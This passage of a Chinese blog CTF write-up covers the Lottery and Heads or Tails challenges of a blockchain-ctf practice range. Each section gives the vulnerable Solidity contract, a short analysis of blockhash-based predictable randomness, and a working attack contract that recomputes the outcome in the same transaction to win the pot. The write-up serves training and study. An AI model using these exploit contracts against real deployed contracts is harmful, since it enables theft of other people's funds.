</span><br><span class="line">    function() external payable ctf&#123;</span><br><span class="line">        totalPot = totalPot.add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function play(uint256 _seed) external payable ctf&#123;</span><br><span class="line">        require(msg.value &gt;= 1 finney, &quot;Insufficient Transaction Value&quot;);</span><br><span class="line">        totalPot = totalPot.add(msg.value);</span><br><span class="line">        bytes32 entropy = blockhash(block.number);</span><br><span class="line">        bytes32 entropy2 = keccak256(abi.encodePacked(msg.sender));</span><br><span class="line">        bytes32 target = keccak256(abi.encodePacked(entropy^entropy2));</span><br><span class="line">        bytes32 guess = keccak256(abi.encodePacked(_seed));</span><br><span class="line">        if(guess==target)&#123;</span><br><span class="line">            //winner</span><br><span class="line">            uint256 payout = totalPot;</span><br><span class="line">            totalPot = 0;</span><br><span class="line">            msg.sender.transfer(payout);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze-5"><a href="#Analyze-5" class="headerlink" title="Analyze"></a>Analyze</h2><p>随机数问题。这种四ui技术只要在同一笔交易中block.numbe是相同的，在一个函数中进行攻击即可</p>
+<h2 id="Attack-5"><a href="#Attack-5" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">interface ctf&#123;</span><br><span class="line">    function ctf_challenge_add_authorized_sender(address _addr) external;</span><br><span class="line">&#125;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    Lottery target=Lottery(0x4b6238A6fb8F061b51DA65BC353F448b9B4bF628);</span><br><span class="line">    constructor() public&#123;&#125;</span><br><span class="line">    function pwn()public payable&#123;</span><br><span class="line">        bytes32 entropy = blockhash(block.number);</span><br><span class="line">        bytes32 entropy2 = keccak256(abi.encodePacked(this));</span><br><span class="line">        uint seed = uint(entropy^entropy2);</span><br><span class="line">        target.play.value(1 finney)(seed);</span><br><span class="line">    &#125;</span><br><span class="line">    receive() external payable&#123;&#125;</span><br><span class="line">    function kill(address payable addr)public payable&#123;</span><br><span class="line">        selfdestruct(addr);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="7-Heads-or-Tails"><a href="#7-Heads-or-Tails" class="headerlink" title="7.Heads or Tails"></a>7.Heads or Tails</h1><h2 id="Code-6"><a href="#Code-6" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line"></span><br><span class="line">import &quot;../CtfFramework.sol&quot;;</span><br><span class="line">import &quot;../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract HeadsOrTails is CtfFramework&#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line"></span><br><span class="line">    uint256 public gameFunds;</span><br><span class="line">    uint256 public cost;</span><br><span class="line"></span><br><span class="line">    constructor(address _ctfLauncher, address _player) public payable</span><br><span class="line">        CtfFramework(_ctfLauncher, _player)</span><br><span class="line">    &#123;</span><br><span class="line">        gameFunds = gameFunds.add(msg.value);</span><br><span class="line">        cost = gameFunds.div(10);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function play(bool _heads) external payable ctf&#123;</span><br><span class="line">        require(msg.value == cost, &quot;Incorrect Transaction Value&quot;);</span><br><span class="line">        require(gameFunds &gt;= cost.div(2), &quot;Insufficient Funds in Game Contract&quot;);</span><br><span class="line">        bytes32 entropy = blockhash(block.number-1);</span><br><span class="line">        bytes1 coinFlip = entropy[0] &amp; 1;</span><br><span class="line">        if ((coinFlip == 1 &amp;&amp; _heads) || (coinFlip == 0 &amp;&amp; !_heads)) &#123;</span><br><span class="line">            //win</span><br><span class="line">            gameFunds = gameFunds.sub(msg.value.div(2));</span><br><span class="line">            msg.sender.transfer(msg.value.mul(3).div(2));</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            //loser</span><br><span class="line">            gameFunds = gameFunds.add(msg.value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze-6"><a href="#Analyze-6" class="headerlink" title="Analyze"></a>Analyze</h2><p>赌博游戏，获胜即可多得百分之五，连续正确20次即可，和上一题大同小异主要是增加了if ((coinFlip &#x3D;&#x3D; 1 &amp;&amp; _heads) || (coinFlip &#x3D;&#x3D; 0 &amp;&amp; !_heads))判断条件，但是_heads可控</p>
+<h2 id="Attack-6"><a href="#Attack-6" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.4.24;</span><br><span class="line">interface Heads&#123;</span><br><span class="line">    function play(bool _heads) external payable;</span><br><span class="line">    function ctf_challenge_add_authorized_sender(address _addr) external;</span><br><span class="line">&#125;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    HeadsOrTails target=HeadsOrTails(0xc7745A854ac557458681240072466aDC54Fa5C17);</span><br><span class="line">    bool public key;</span><br><span class="line">    function pwn() public payable&#123;</span><br><span class="line">        bytes32 entropy = blockhash(block.number-1);</span><br><span class="line">        bytes1 coinFlip = entropy[0] &amp; 1;</span><br><span class="line">        if(coinFlip==0)</span><br><span class="line">        key=false;</span><br><span class="line">        if(coinFlip==1)</span><br><span class="line">        key=true;</span><br><span class="line">        for(uint i=1;i&lt;=20;i++)</span><br><span class="line">        &#123;target.play.value(0.1 ether)(key);&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function() external payable&#123;&#125;</span><br><span class="line">    function ret(address addr)public payable&#123;</span><br><span class="line">        msg.sender.transfer(this.balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>bcYng
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/2022/03/19/blockchain-ctf%E4%B8%8A/" title="blockchain-ctf靶场刷题part1&#x2F;2">http://example.com/2022/03/19/blockchain-ctf上/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag"># 区块链</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/19/ethernaut%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E4%B8%8B/" rel="prev" title="Ethernaut靶场刷题part2/3">
+      <i class="fa fa-chevron-left"></i> Ethernaut靶场刷题part2/3
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-Donation"><span class="nav-number">1.</span> <span class="nav-text">1.Donation</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code"><span class="nav-number">1.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze"><span class="nav-number">1.2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack"><span class="nav-number">1.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-Lock-Box"><span class="nav-number">2.</span> <span class="nav-text">2.Lock Box</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-1"><span class="nav-number">2.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze-1"><span class="nav-number">2.2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-1"><span class="nav-number">2.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-Piggy-Bank"><span class="nav-number">3.</span> <span class="nav-text">3.Piggy Bank</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-2"><span class="nav-number">3.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze-2"><span class="nav-number">3.2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-2"><span class="nav-number">3.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-SI-Token-Sale"><span class="nav-number">4.</span> <span class="nav-text">4.SI Token Sale</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-3"><span class="nav-number">4.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze-3"><span class="nav-number">4.2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-3"><span class="nav-number">4.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-Secure-Bank"><span class="nav-number">5.</span> <span class="nav-text">5.Secure Bank</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-4"><span class="nav-number">5.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze-4"><span class="nav-number">5.2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-4"><span class="nav-number">5.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-Lottery"><span class="nav-number">6.</span> <span class="nav-text">6.Lottery</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-5"><span class="nav-number">6.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze-5"><span class="nav-number">6.2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-5"><span class="nav-number">6.3.</span> <span class="nav-text">Attack</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#7-Heads-or-Tails"><span class="nav-number">7.</span> <span class="nav-text">7.Heads or Tails</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-6"><span class="nav-number">7.1.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze-6"><span class="nav-number">7.2.</span> <span class="nav-text">Analyze</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Attack-6"><span class="nav-number">7.3.</span> <span class="nav-text">Attack</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="bcYng"
+      src="https://raw.githubusercontent.com/bcYng-w/images/main/touxaing.png">
+  <p class="site-author-name" itemprop="name">bcYng</p>
+  <div class="site-description" itemprop="description">前程似锦</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/bcYng-w" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;bcYng-w" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=2384417651@qq.com" title="E-Mail → https:&#x2F;&#x2F;mail.qq.com&#x2F;cgi-bin&#x2F;qm_share?t&#x3D;qm_mailme&amp;email&#x3D;2384417651@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022-2-14 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">bcYng</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共17.5k字</span>
+</div>
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
